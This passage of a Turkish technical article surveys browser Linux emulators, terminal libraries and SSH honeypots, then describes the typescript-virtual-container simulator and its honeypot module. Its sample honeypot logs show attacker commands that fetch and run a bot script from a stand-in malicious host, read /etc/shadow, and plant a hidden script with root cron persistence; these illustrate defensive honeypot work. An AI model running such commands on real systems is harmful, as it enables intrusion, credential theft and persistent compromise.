Ortaya çıkan `.wasm` büyüktür -- minimal bir Ubuntu birkaç yüz MB'tır -- ama tamamen kendi kendine yeterlidir. Birine bir `.wasm` e-postayla gönderebilirsin ve onlar tarayıcılarında Ubuntu çalıştırabilir. Bu cümle mantıklı olmamalı ama işte buradayız.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Emülatör ailesi özeti

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Mimari** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (özel) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Gerçek çekirdek** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | yok | ✅ |
| **npm paketi** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI aracı) |
| **Node.js kullanımı** | ✅ | ❌ | ❌ | ❌ | ❌ (sadece tarayıcı) | Wasmtime ile |
| **Tarayıcı kullanımı** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/örnek** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **Başlatma süresi** | 15–40s | 10–30s | 10–30s | 15–40s | 2–5s | 10–40s |
| **Açık kaynak** | ✅ | ✅ | ✅ | ❌ | kısmi | ✅ |
| **Durum** | ✅ çok aktif | ✅ kararlı | ⚠️ arşivlenmiş | ✅ ticari | ✅ aktif | ✅ aktif |

Bu tablodan göze çarpan: `v86`, npm paketi olan, hem tarayıcıda hem Node'da çalışan ve açık kaynak olan tek emülatör. Bu yüzden "JavaScript Linux emülatörü" konuşmalarına hakimdir. Diğer her şeyin bir yakalaması vardır -- JSLinux'un API'si yoktur, jor1k arşivlenmiştir, CheerpX para gerektirir, WebContainers sadece tarayıcı ve Node'a özeldir, container2wasm bir derleme adımı ve CLI gerektirir. Sadece "JavaScript'te Linux başlatmak" istiyorsan, `v86` neredeyse her zaman doğru başlangıç noktasıdır.

---

## Bölüm 3 -- Terminal yığınları: xterm.js ve node-pty

İki paket, insanlar shell benzeri deneyimler inşa ettiğinde sürekli karşımıza çıkar. Sandbox veya emülatör değiller -- UI ve PTY tesisatıdır -- ama o kadar bitişiktirler ki onları dışarıda bırakmak kötü hissettirirdi. Ayrıca ikisini de kullandım ve gerçekten iyiler.

### 3.1 `xterm.js` -- terminal renderlayıcısı

xterm.js, tarayıcı için bir terminal emülatörüdür. Bir terminal ekranını (VT100/xterm kaçış dizileri) bir `<canvas>` öğesinde renderlar, klavye girdisini işler ve veri akışı için bir API sunar.

Kullananlar: VS Code'un entegre terminali, Azure Cloud Shell, Proxmox VE, AWS CloudShell ve daha birçokları.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Terminale veri gönder (metin olarak renderlanır)
term.write("$ ");
term.onData(data => {
  // data tuş vuruşlarıdır -- backend'ine gönder
  socket.send(data);
});
socket.onmessage(msg => {
  // backend'den gelen çıktı -- görüntüle
  term.write(msg.data);
});
```

xterm.js sadece renderlama katmanıdır. Bir shell çalıştırmaz. Komutları yorumlamaz. Hangi backend'e bağlamak istersen ona bağladığın bir görüntü bileşenidir. Birçok kişi xterm.js'nin "terminali yaptığını" düşünür ama aslında sadece ekrandır -- yine de onu gerçekten komut çalıştıran bir şeye bağlaman gerekir.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- PTY başlatma

`node-pty`, Node.js'de bir sahte terminal (PTY) başlatır ve ona bir okuma/yazma tanıtıcısı verir. xterm.js ile kullanıldığında, sunucuda çalışan gerçek bir shell (bash, zsh, fish) ile konuşan bir tarayıcı terminali inşa etmeni sağlar.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // WebSocket aracılığıyla tarayıcıdaki xterm.js'ye gönder
  ws.send(data);
});

ws.on("message", data => {
  // Tarayıcıdaki tuş vuruşlarını shell'e ilet
  shell.write(data);
});
```

Bu, bulut IDE'leri ve web terminalleri için standart desendir: xterm.js (tarayıcı) ↔ WebSocket ↔ node-pty ↔ gerçek bash. İzolasyon yok. Shell, Node.js sürecinin tam izinleriyle çalışır.

**Bakımcı**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Bölüm 4 -- SSH honeypot'ları

Honeypot'lar saldırıya uğramak için tasarlanır. Amaç, saldırganların etkileşime girmesi için yeterince gerçek görünmek, aynı anda yaptıkları her şeyi tehdit istihbaratı için kaydetmektir. SSH birincil hedeftir çünkü internette en çok saldırıya uğrayan hizmettir -- genel bir IP'de 22. portu açarsan, dakikalar içinde otomatik tarama girişimleri göreceksin. Bir ara dene, ne kadar hızlı olduğu dehşet verici.

Bir honeypot'un kalitesi iki şeyle ölçülür: **sadakat** (gerçek bir sistemmiş gibi ne kadar inandırıcı olduğu) ve **telemetri** (ne kadar faydalı veri yakaladığı). Bunlar gerilim halindedir. Yüksek sadakatli bir honeypot inşa etmesi daha zor ve işletmesi daha risklidir.

Bu bölüm, beni sonunda `typescript-virtual-container`'da `HoneyPot` modülünü inşa etmeye yönlendiren şeydir, bu yüzden burada bazı fikirlerim var.

### 4.1 Cowrie -- altın standart

Cowrie, Python tabanlı orta-yüksek etkileşimli bir SSH ve Telnet honeypot'udur. Araştırma ve güvenlik topluluğunda en yaygın kullanılan SSH honeypot'udur.

Mimari:
- **Protokol katmanı**: gerçek SSH protokolü uygulaması (Twisted Conch), böylece saldırganlar gerçek el sıkışmalar, gerçek anahtar değişimi, gerçek kimlik doğrulama alır
- **Shell katmanı**: sahte bir dosya sistemi (Debian 5.0'a benzeyen) ve yaygın komutlara yanıt veren kısmi bir shell yorumlayıcı
- **Proxy modu**: arkasındaki gerçek bir sisteme yönlendirebilir (yüksek etkileşim modu), içinden geçen her şeyi kaydeder
- **LLM modu** (yeni eklenen): nasıl işleyeceğini bilmediği komutlara dinamik yanıtlar üretmek için bir dil modeli kullanır -- evet, Cowrie'nin artık bir AI modu var. Çılgın zamanlar.

```python
# Cowrie'nin yakaladıkları
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie, kötü amaçlı yazılım analizi için indirilen dosyaları (wget/curl/SFTP/SCP aracılığıyla) kaydeder. Splunk, Elasticsearch ve diğer SIEM platformlarıyla entegre olur.

**Sadakat**: orta-yüksek. Otomatik botları kandırmak için yeterince inandırıcı (SSH saldırganlarının %99'u -- çoğu sadece `root`/`password` deneyen aptal scriptlerdir). Ancak sofistike insanlar onu parmak iziyle tespit edebilir, genellikle oldukça hızlı.

**Dil**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- Cowrie'nin öncülü

Kippo, Cowrie'nin dayandığı orijinal orta etkileşimli SSH honeypot'udur. Aynı temel fikir: gerçek SSH protokolü, sahte dosya sistemi, kısmi shell. Cowrie bu noktada onu tamamen geride bırakmıştır -- Kippo arşivlenmiştir ve 2026'da kimse onu çalıştırıyor olmamalıdır. Tamamen tarihsel bütünlük için bahsedilmiştir, eski blog yazılarında ve güvenlik makalelerinde referans verildiğini görebilirsin.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- arşivlenmiş

---

### 4.3 endlessh -- SSH katran çukuru

endlessh, dejenere bir honeypot'tur: SSH bağlantılarını, saniyede 1 bayt (veya daha yavaş) banner verisi damlatarak açık tutar. Ona bağlanan bir SSH istemcisi sonsuza kadar takılı kalır -- sunucu banner'ı göndermeyi bitirmediği için kimlik doğrulamaya asla geçemez.

Amaç tehdit istihbaratı değil, saf kaynak reddidir: saldırgan tarayıcı thread'lerini meşgul ederek gerçek hedeflere daha hızlı vuramamalarını sağlamak. Dürüst olmak gerekirse, en iyi şekilde biraz kötücül. Saldırgandan hiçbir şey öğrenmiyorsun -- sadece zamanlarını boşa harcıyorsun. Bunun derin bir tatmini var.

```c
// endlessh'in tüm protokol davranışı:
// Gönder: "SSH-2.0-OpenSSH_" sonra yavaşça rastgele karakterler ekle
// Bağlantıyı asla kapatma
// Saldırgan tarayıcı N saniye sonra zaman aşımına uğrar
```

Hiçbir komut yakalanmaz. Hiçbir kimlik doğrulama test edilmez. Sadece bağlantı süresi.

**Yazıldığı dil**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- "herkesi içeri al" honeypot'u

sshesame, her SSH bağlantısını kabul eder (herhangi bir kullanıcı adı, herhangi bir parola, herhangi bir anahtar) ve her şeyi kaydeder. Sıfır etkileşimli bir honeypot'tur: komutlara yanıt vermez, sadece saldırganları "içeri" alır ve yazdıkları her tuş vuruşunu kaydeder.

```
2024-01-15 03:22:11 45.33.32.156'dan bağlantı
  Kullanıcı adı: root, Parola: password123 -- kabul edildi
  Yazılan komutlar:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47s sonra bağlantı kesildi
```

Kimlik bilgisi toplama için faydalıdır: botların denediği kullanıcı adlarını ve parolaları hızla biriktirirsin, bu da hangi varsayılan kimlik bilgilerinin şu anda aktif olarak kaba kuvvet saldırısına uğradığını söyler. Spoiler: her zaman `root`/`password`, `admin`/`admin` ve `root`/`123456`. Her seferinde.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- Docker tabanlı honeypot framework'ü

`lyrebird/honeypot-base`, ağ hizmeti honeypot'ları inşa etmek için bir Docker temel imajıdır. Spesifik olarak bir SSH honeypot'u değildir -- herhangi bir protokol honeypot'u inşa etmek için bir framework'tür.

Temel imaj, bir günlük kaydı framework'ü, protokoller için bir eklenti sistemi ve çoklu hizmet honeypot'ları için Docker Compose kurulumları sağlar. Belirli hizmetleri taklit etmek için genişletirsin.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.js'de bir SSH honeypot'u inşa etmek -- saf yol ve neden başarısız olduğu

`typescript-virtual-container`'dan önce, Node.js'de bir SSH honeypot'u inşa etmek, gerçek `ssh2` kütüphanesini manuel komut taklitçiliğiyle birleştirmek anlamına geliyordu. Çok sıkıcı, çok eksik, ama yani... bu noktada bir geçiş ayini:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Girişimi günlüğe kaydet
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Herkesi içeri al
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Sahte yanıt
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Bu, kimlik bilgilerini ve komutları yakaladığı anlamında "çalışır". Ancak sofistike bir saldırgan ona dokunduğu an bariz bir şekilde sahtedir. `uname -a`'nın doğru dizeyi döndürmesi ama `ls /etc`'nin "command not found" döndürmesi bir işarettir. Dosya sistemi yoktur. Komutlar zincirlemez. Borular çalışmaz. Değişkenler genişlemez.

Yetenekli bir saldırgan, honeypot'unu ilk beş komutta parmak iziyle tespit eder. Cowrie benzeri davranışları kontrol eden otomatik scriptler de onu hemen tespit edecektir. Görünüşe göre, `typescript-virtual-container` yazarını komutları gerçekten yorumlayan bir şey inşa etmeye iten şey buydu -- Bölüm 5'te daha fazlası.

---

### Honeypot ailesi özeti

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Saf ssh2 |
|---|---|---|---|---|---|---|
| **Etkileşim seviyesi** | orta-yüksek | orta | sıfır | sıfır | değişir | düşük |
| **Gerçek SSH protokolü** | ✅ | ✅ | ❌ (tarpit) | ✅ | değişir | ✅ |
| **Shell sadakati** | orta | orta | yok | yok | değişir | minimal |
| **Kimlik bilgisi yakalar** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Komut yakalar** | ✅ | ✅ | ❌ | ✅ | değişir | ✅ |
| **Kötü amaçlı yazılım yakalar** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM entegrasyonu** | ✅ yerel | ❌ | ❌ | ❌ | ❌ | manuel |
| **LLM yanıtları** | ✅ (yeni) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Dil** | Python | Python | C | Go | Docker | Node.js |
| **Node.js yerel** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Durum** | ✅ çok aktif | ⚠️ arşivlenmiş | ✅ aktif | ✅ aktif | ✅ aktif | DIY |

Buradaki desen oldukça net: ne kadar çok sadakat istersen, o kadar çok Python yazman gerekir. Bunu ciddi yapıyorsan Cowrie açık ara kazanandır -- yıllardır savaşta test edilmiştir ve sadece kimlik bilgilerinden çok daha fazlasını yakalar. endlessh ve sshesame, ciddi tehdit istihbarat araçlarından çok eğlenceli yan projelerdir. Ve saf Node.js yaklaşımı, bir duvara çarpmadan önce yolun belki %20'sine kadar götürür.

---

## Bölüm 5 -- `typescript-virtual-container`: boşluğu dolduran şey

Tamam, işte işlerin ilginçleştiği yer. Yukarıdaki tüm aileleri katalogladıktan sonra, eksik çeyrek oldukça bariz hale geliyor:

- JS sandbox'ları: kodu izole eder, shell yok, dosya sistemi yok, SSH yok
- Linux emülatörleri: gerçek işletim sistemi, gerçek shell, gerçek SSH... ama 150+ MB RAM, 30 saniyelik başlatma ve seri G/Ç üzerine kendi API'ni inşa etmen gerekiyor
- Honeypot'lar: sahte shell, programatik API yok, Python/Go/C, Node-yerel değil

Kimse eksiksiz, programatik, Node-yerel bir Linux ortamını gerçek SSH, gerçek izinler, gerçek sanal ağ ve tipli bir TypeScript API ile inşa etmemişti. O yüzden o inşa etti.

Hızlı tanıtım -- ondan ilk kez düzgün bir şekilde bahsediyorum: `typescript-virtual-container`, çevrimiçi olarak **Fortune** (veya ItsRealFortune) olarak bilinen Fransız geliştirici [Chloé Rolzhausen](https://itsrealfortune.fr) tarafından inşa edildi. Onu [web sitesinde](https://itsrealfortune.fr) ve [LinkedIn'de](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//) bulabilirsin. Tüm proje -- 56 bin satır TypeScript, 247 dosya, 170 komut -- tek bir kişinin solo çabasıydı. Makalenin geri kalanında ona Fortune diyeceğim. Ve evet, oldukça çılgınca. Git bak!

### Gerçekte ne olduğu

`typescript-virtual-container`, saf TypeScript ile yazılmış bir **Linux ortamı simülatörüdür**. Wasm yok. Yerel eklenti yok. Çekirdek yok. 247 TypeScript dosyası boyunca ~56.000 satır kaynak.

Temel içgörü: `ls /etc | grep passwd` çalıştırmak için bir CPU emülatörüne ihtiyacın yok. İhtiyacın olan:
1. Yol işlemlerine yanıt veren bellek içi bir düğüm ağacı
2. Her erişimde uygulanan bir POSIX izin modeli
3. Pipeline'ları, yönlendirmeleri, alt shell'leri ve değişken genişletmeyi anlayan bir shell ayrıştırıcısı
4. ~170 komut uygulaması (fonksiyonlar, ikili dosyalar değil)
5. Bir kullanıcı ve grup yönetim sistemi
6. Tüm bunları SSH üzerinden sunacak bir şey

Tüm bunlar, çekirdek katılımı olmadan saf TypeScript'te başarılabilir.

### VirtualFileSystem

VFS, tipli düğümlerden oluşan bellek içi bir ağaçtır -- açıkça `"fs"` kalıcılık modunu etkinleştirmediğin sürece disk G/Ç yoktur:

```ts
// Basitleştirilmiş iç temsil
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // tembel yüklenen yer tutucu
```

Her yol işlemi `normalizePath` (`.`, `..`, sembolik bağları çözer) ve `enforceAccess` (istekte bulunan uid/gid'e karşı okuma/yazma/çalıştırma iznini kontrol eder) üzerinden geçer. `chmod`, `chown`, sticky bit'ler ve setuid'in hepsi uygulanmıştır ve gerçekten uygulanır. uid 1000 olarak çalışan bir süreç, root'a ait 0600 modundaki bir dosyayı okumaya çalışırsa EACCES alır -- sahte bir EACCES değil, izin kontrolünden fırlatılan gerçek bir JavaScript `Error`'ı. Bu kısım oldukça zarif, dürüst olmak gerekirse.

VFS şunlara serileştirilir:
- `.vfsb` -- kompakt bir ikili format (özel, fflate sıkıştırmalı) -- bu varsayılandır
- JSON snapshot'ı -- insan tarafından okunabilir, hata ayıklama için iyi
- TAR arşivi -- gerçek tar formatıyla içe/dışa aktarma, böylece `tar -xf` bir şey yapabilirsin ve VFS... o dosyalara sahip olur
- SquashFS imajı -- salt okunur içe aktarma

`"fs"` kalıcılık modunda, çökme kurtarma için bir yazma-önde günlüğü (WAL) tutar -- yazmalar önce günlüğe gider, ardından temizleme sırasında snapshot'a. Node işlemin yarıda çökerse, günlük son tam durumu yeniden yapılandırmana izin verir.

Ayrıca disk G/Ç gecikmesini simüle eden bir `FileCache` katmanı vardır. `NVME_DISK_IO` veya `HDD_DISK_IO` gibi profiller yapılandırabilirsin ve VFS, gerçekçi zamanlamaları eşleştirmek için dosya işlemlerini yapay olarak geciktirir. Ki bu biraz komik -- yazılımın donanımı simüle etmek için kendini kasıtlı olarak yavaşlatması -- ama aslında kıyaslama için çok kullanışlı.

### Shell yorumlayıcı

Shell ayrıştırıcısı tipli bir AST üretir:

```ts
// "ls /etc | grep root && echo done" şuna ayrıştırılır:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Yürütücü bu AST'de yürür:
- Bir pipeline için, bir `{ stdin, stdout, stderr }` akış zinciri oluşturur ve her komutu borulu G/Ç ile yürütür
- Mantıksal operatörler (`&&`, `||`) için, sağ tarafı çalıştırmadan önce sol taraftan sonra `$?` kontrol eder
- Alt shell'ler (`$(...)`, `` ` ` ``) için, yürütme context'ini fork eder
- Yönlendirmeler (`>file`, `>>file`, `2>&1`, `<file`) için, yürütmeden önce akış bağlantısını kurar
- Arka plan işleri (`cmd &`) için, tamamlanmasını beklemeden çalıştırır
- Değişkenler için, `$VAR`, `${VAR:-default}`, `${#VAR}` ve aritmetik `$((expr))` ifadelerini genişletir
- Süslü parantez genişletmesi (`{a,b,c}`, `{1..5}`) için, yürütmeden önce tam genişletme listesini üretir

Tüm bunlar gerçek POSIX shell davranışıdır. Ayrıştırıcı heredoc'ları, süreç ikamesini, globbing'i (`*`, `?`, `[abc]`) ve tırnak işlemeyi (tek tırnak, enterpolasyonlu çift tırnak, ters eğik çizgi kaçışı) işler. Mükemmel değildir -- uç durumlar vardır -- ama bir TypeScript projesinden bekleyeceğinin çok ötesindedir.

### ~170 yerleşik komut

Komutlar, bir komut kaydına kayıtlı TypeScript fonksiyonlarıdır. stdin/stdout/stderr akışları, VFS, kullanıcı oturumu, shell ortamı ve alt modüllere erişim içeren bir `CommandContext` alırlar.

170 Unix komut uygulaması yazmak... çok şeydir. Bazıları önemsizdir (`echo`, `true`, `false`), bazıları şaşırtıcı derecede karmaşıktır (`awk`, `find`, `tar`). Yani, tam POSIX `awk`? TypeScript'te? Bu delice, dürüst olmak gerekirse. İşte içinde olanlardan bir örnek:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (istemci tarafı, dışarı bağlanan),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (taslak), python3 (taslak), node (taslak),
nano (tam etkileşimli düzenleyici), vim (temel), vi (temel),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simüle edilmiş), systemctl (taslak), journalctl (taslak),
...ve ~130 tane daha
```

"Taslak"lar (git, python3, node), yaygın kullanımlara gerçekçi yanıt verir -- `python3 --version` inandırıcı bir sürüm dizesi döndürür, `git status` sahte bir repo durumu gösterir -- gerçek bir iş yapmadan. Bir honeypot için bunlar aslında gerçek şeylerden daha kullanışlıdır, çünkü saldırganların gerçekten zararlı bir şey çalıştırmadan ne çalıştırmaya çalıştıklarını gözlemlemeni sağlarlar.

### SSH sunucusu

SSH katmanı, gerçek `ssh2` npm paketini kullanır -- gerçek SSH protokolü, gerçek anahtar değişimi, gerçek şifreleme. `SSHMimic` onu sarar:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Gerçek SSH: ssh -p 2222 root@localhost
// Gerçek SFTP: sftp -P 2222 root@localhost
// Gerçek SCP: scp -P 2222 file root@localhost:/tmp/
```

`shellProperties`, `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` ve `/etc/os-release`'in ne bildireceğini belirler. Herhangi bir Linux dağıtımını ve çekirdek sürümünü inandırıcı bir şekilde taklit edebilirsin -- gerçek bir SSH istemcisine farkı söylemenin kesinlikle hiçbir yolu yoktur.

### HoneyPot modülü

Shell yorumlayıcı gerçek ve SSH sunucusu gerçek olduğu için, saldırgan komutları sanal ortamda gerçekten yürütülür. Saldırgan tarafından tetiklenen `wget` istekleri, hedef URL'lerle birlikte günlüğe kaydedilir. Saldırgan tarafından oluşturulan dosyalar VFS'de kaydedilir. Saldırganın izin yükseltme girişimleri gerçekçi hatalar üretir.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Bir oturumdan sonra, dosya sisteminin diff'ini al
const before = shell.vfs.toSnapshot();
// ... saldırgan oturumu ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Bu, Cowrie'den niteliksel olarak farklıdır. Cowrie'nin sahte dosya sistemi `ls`'ye yanıt verebilir ancak bir saldırganın hangi dosyaları oluşturduğunu ve yapılandırılmış bir diff olarak hangi değişiklikleri yaptığını gerçekten takip edemez. `typescript-virtual-container` bunu yapabilir, çünkü VFS canlı bir veri yapısıdır -- her yazma işlemi takip edilir. Saldırganın az önce eklediği cron girdisi mi? Diff'te. O `.hidden` klasörü mü? Diff'te. Kötü amaçlı yazılım analizi için oldukça kullanışlı.

### Sanal ağ yığını

Bu, muhtemelen tüm projenin en etkileyici kısmıdır ve bu alandaki başka hiçbir projede benzeri yoktur. Yani, VPN desteği olan, saf TypeScript ile yazılmış, hiçbir gerçek ağ bağdaştırıcısı içermeyen tam bir L2/L3 sanal ağ yığını. Bu gerçekten çılgınca.

`VirtualNetworkManager`, her `VirtualShell` örneğine, yapılandırılabilir IP adresleri, yönlendirme tabloları ve bir yazılım güvenlik duvarı (conntrack ve NAT ile iptables tarzı kurallar) içeren sanal ağ arayüzleri verir. `ip addr`, `ip route`, `iptables -L`, `netstat -rn`'in tümü sanal ağ durumunu gösterir.

`VirtualSwitch` (Fransızca "baie informatique" -- sunucu rafı bölmesi kelimesinden gelen Baie adıyla), birden çok shell'i paylaşılan bir alt ağda birbirine bağlar. Şunları uygular:
- MAC öğrenme ve ARP
- Alt ağlar arası IP yönlendirme
- NAT (giden maskeleme)
- DNS (alt ağ başına yapılandırılabilir kayıtlar)
- Yük dengeleme (round-robin, en az bağlantı)
- Trafik şekillendirme: gecikme, jitter (Gaussian dağılımı), paket kaybı, patlama kaybı, yeniden sıralama, çoğaltma
- Bant genişliği sınırlama (token bucket)
- MTU zorlama
- Bağlantı takibi (durum bilgili, NEW/ESTABLISHED/TIME_WAIT durumlarıyla)

```ts
const baie = new Baie("192.168.0.0/24");

// Aynı switch'te üç sanal makine
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Güvenlik duvarı: web api'ye ulaşabilir, api db'ye ulaşabilir, web db'ye doğrudan ulaşamaz
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Trafik şekillendirme: dışarıya dengesiz bir WAN bağlantısını simüle et
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn`, Baie örnekleri arasında şifreli tüneller oluşturur -- siteler arasında VPN ara bağlantıları olan çoklu site ağını simüle edebilirsin.

`VirtualProxy`, port yönlendirme ve bir SOCKS5 proxy'si uygular.

Bunların hiçbiri gerçek bir ağ bağdaştırıcısına dokunmaz. Hepsi TypeScript nesne yönlendirmesidir. `ping` komutu, sanal switch üzerinden yönlendirilerek ve simüle edilmiş ICMP yanıtları döndürülerek "çalışır". `curl http://192.168.0.3/api`, sanal ağ üzerinden yönlendirilir, api shell'inin simüle edilmiş HTTP yanıtına çarpar ve içeriği döndürür. Mümkün olan en iyi şekilde, sonuna kadar kaplumbağalar.

### SandboxedShell

Daha güçlü izolasyon gerektiren programatik kullanım için, `SandboxedShell` bir Node.js Worker thread'inde bir shell oturumu çalıştırır:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // bir çekirdeğin %25'i
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Buradaki izolasyon, VFS katmanı (worker thread'in shell'i yalnızca sanal dosya sistemini görebilir, asla ana bilgisayar dosya sistemini göremez) artı Node.js Worker thread bellek izolasyonu ile zorlanır. Bu, `isolated-vm`'den daha hafiftir ancak JS seviyesi izolasyondan ziyade shell seviyesi izolasyon için daha uygundur.

### Kaynak sınırlama

Sistem izleme komutlarının ne bildireceğini etkileyen, shell başına kaynak sınırları yapılandırabilirsin:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Bu shell'in içinde, `free -m` toplam 512 MB RAM gösterir. `nproc` 2 döndürür. `/proc/meminfo` sınırlanmış değerleri gösterir. `htop` ve `top` sınırlanmış CPU sayısını gösterir. Bu, sahte makinenin donanım profilini hassas bir şekilde parmak iziyle belirlemeni sağlar.

### Üç dağıtım modu

```
Mod 1: SSH/SFTP sunucusu
  VirtualSshServer / VirtualSftpServer
  → Gerçek SSH protokolü, gerçek SFTP, gerçek SCP
  → Kullanım alanı: honeypot'lar, uzak test ortamları, eğitim laboratuvarları

Mod 2: Web shell (tarayıcı)
  builds/fortune-nyx-v1.7.6-web.min.js (ESM paketi)
  → Tarayıcıda çalışır, VFS IndexedDB'de kalıcıdır
  → Kullanım alanı: etkileşimli eğitimler, gömülü terminaller, demolar
  → Bonus: tam simüle edilmiş bir XFCE masaüstü için startxfce4 çalıştır

Mod 3: Bağımsız CLI
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (tek dosya, kurulum yok)
  → curl ile çalıştır, VFS'yi .vfs/ dizininde kalıcı yap
  → Kullanım alanı: hızlı demolar, yerel deneyler
```

### Polyfill'ler -- tarayıcı derlemesi Wasm olmadan nasıl çalışıyor

Tamam, bu gerçekten zekice bulduğum ve özellikle belirtmek istediğim kısım.

